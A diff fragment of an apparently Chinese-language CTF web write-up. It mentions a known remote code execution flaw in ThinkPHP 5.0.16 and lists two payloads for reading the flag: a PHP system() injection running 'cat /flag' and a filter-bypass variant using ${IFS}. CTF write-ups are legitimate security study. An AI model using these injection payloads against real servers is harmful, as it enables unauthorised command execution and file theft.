@@ -27,6 +27,7 @@ tp5.0.16,这个版本的tp有rce的nday,
 
 ![web-1.5](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-1.5.png)
 
+
 查看flag:
 
 `<?php%20system("cat /flag");?>` `cat${IFS}/flag`
